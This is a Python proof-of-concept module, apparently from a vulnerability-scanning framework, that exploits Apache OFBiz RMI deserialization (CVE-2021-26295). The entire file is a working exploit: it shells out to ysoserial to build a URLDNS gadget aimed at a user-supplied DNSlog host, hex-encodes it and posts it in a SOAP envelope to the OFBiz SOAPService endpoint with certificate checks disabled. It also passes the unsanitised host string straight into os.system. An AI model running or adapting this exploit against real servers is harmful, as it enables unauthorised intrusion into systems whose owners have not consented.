import pocs
import requests
import sys
from lib import config
import binascii
import getopt
import os
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='Apache OFBiz rmi反序列化'
        self.vul_name='Apache OFBiz rmi反序列化'
        self.vul_num='CVE-2021-26295'
        self.app_name='apache OFBiz'
        self.app_version='<17.12.06'
        self.author='haochen'
        self.msg='输入dnslog地址，攻击成功后会在dnslog中显示'
        self.must_parameter={
            'target' : '',
            'dns_url':''
        }

    def exploit(self, must_parameter, choo_parameter):
        att_msg = {}
        dns_url = must_parameter['dns_url']
        target = must_parameter['target']
        self.ysoserial(dns_url)
        hex=self.gethex()
        self.attack(hex,target,dns_url)
        return att_msg

    def gethex(self):
        file = '123.ot'
        f= open(file,'rb')
        content = f.read()
        hex=binascii.hexlify(content)
        hex=str(hex)
        hex = hex[2:len(hex)-1]
        f.close()
        return hex

    def ysoserial(self,dns_url):
        os.system(config.PyTools['ysoserial']+' URLDNS http://'+dns_url+' > 123.ot')

    def attack(self,hex,target,dns_url):
        if target[-1] == '/':
            url = target +'webtools/control/SOAPService'
        else:
            url = target +'/webtools/control/SOAPService' 
        headers = { 'User-Agent': 'ua.random' }
        headers["Content-Type"]="text/xml"
        data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header/>
            <soapenv:Body>
            <ser>
        <map-HashMap>
            <map-Entry>
                <map-Key>             
                    <cus-obj>'''+hex+'''</cus-obj>
                </map-Key>
                <map-Value>
                    <std-String value="http://'''+dns_url+'''"/>
                </map-Value>
            </map-Entry>
        </map-HashMap>
            </ser>
            </soapenv:Body>
            </soapenv:Envelope>
        '''
        try:
            re = requests.post(url=url,data=data,headers=headers,verify = False)
            print('\n[+] '+ target +' 发送payload成功')
        except:
            print('\n[-] '+ target +' 发送payload失败')


